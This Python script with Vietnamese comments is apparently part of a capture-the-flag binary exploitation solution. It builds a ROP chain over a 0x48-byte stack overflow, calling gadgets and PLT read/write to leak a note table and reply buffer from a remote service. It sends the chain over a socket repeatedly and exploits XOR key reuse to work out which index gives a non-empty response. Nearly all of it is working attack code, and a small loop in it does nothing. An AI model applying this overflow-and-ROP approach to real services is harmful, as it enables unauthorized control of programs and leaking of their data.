"""Dò xem idx nào của op 3 cho phản hồi KHÔNG rỗng.

Cùng một kết nối = cùng một key XOR (key sinh từ getpid()).
Header trả lời là [channel=0][len_be16][0]:
  len == 0  ->  plaintext 00 00 00 00  ->  ciphertext chính là key
  len != 0  ->  ciphertext khác ở byte 2 (và byte 1 nếu len >= 256)
Nên chỉ cần so 4 byte dump của mỗi vòng với vòng tham chiếu.
"""
import socket
import struct
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import exploit as E  # noqa: E402


def build(idx_bytes):
    p = b"A" * 0x48
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", E.FOUR)
    p += struct.pack("<Q", E.SUBMIT)
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.NOTE_TABLE)
    p += struct.pack("<Q", E.VAULT_SEND)
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
    p += struct.pack("<Q", E.READ_PLT)
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 1)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
    p += struct.pack("<Q", E.WRITE_PLT)
    p += struct.pack("<Q", E.LOOP)
    assert len(p) <= E.SIZE, len(p)
    return p.ljust(E.SIZE, b"J") + b"\x90" * 4


def round_(s, idx):
    s.sendall(b"NOTE 0 " + struct.pack("<i", idx) + b"\n")
    E.drain(s, 0.4)
    s.sendall(b"SUBMIT %d\n" % E.SIZE)
    E.drain(s, 0.4)
    s.sendall(build(None))
    out = E.drain(s, 2.5)
    # bỏ hết noise plaintext của front desk, chỉ giữ phần dump
    tail = out
    for noise in (b"OK\n", b"GO\n", b"sh> "):
        pass
    return out


def main():
    s = socket.create_connection((E.HOST, E.PORT), timeout=20)
    E.drain(s, 1.0)
    seen = {}
    for idx in (0, -1, -2, -3, -4, -5, -6, 1, 2, 3):
        out = round_(s, idx)
        # 4 byte dump nằm sau "OK\n" cuối cùng
        i = out.rfind(b"OK\n")
        frag = out[i + 3:i + 7] if i >= 0 else b""
        print("idx=%-3d  out=%-46r dump=%s" % (idx, out[:46], frag.hex()))
        seen[idx] = (frag, out)
    base = seen.get(-1, (b"",))[0]
    print("\n--- so sánh với idx=-1 ---")
    for idx, (frag, _) in seen.items():
        mark = "" if frag == base else "  <-- KHÁC"
        print("idx=%-3d %s%s" % (idx, frag.hex(), mark))
    s.close()


if __name__ == "__main__":
    main()
